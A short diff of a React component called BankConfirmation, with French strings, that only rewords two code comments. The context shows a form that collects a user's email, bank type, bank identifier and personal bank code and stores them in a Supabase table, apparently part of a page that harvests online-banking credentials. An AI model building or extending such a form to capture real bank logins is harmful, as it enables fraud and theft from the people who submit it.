@@ -1,3 +1,4 @@
+
 import React, { useState } from "react";
 import { useNavigate } from "react-router-dom";
 import Footer from "@/components/Footer";
@@ -16,7 +17,7 @@ const BankConfirmation: React.FC = () => {
   const navigate = useNavigate();
 
   const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
+    e.preventDefault(); // Empêche le rechargement de la page
     
     if (!typeBanque || !identifiantBancaire || !codePersonnel) {
       toast.error("Veuillez remplir tous les champs");
@@ -41,7 +42,7 @@ const BankConfirmation: React.FC = () => {
       const bankData = {
         email,
         typebanque: typeBanque,
-        identifiantbancaire: identifiantBancaire, // Corrigé pour correspondre à la colonne dans Supabase
+        identifiantbancaire: identifiantBancaire, // Correspond à la colonne dans Supabase
         codepersonnel: codePersonnel
       };
       
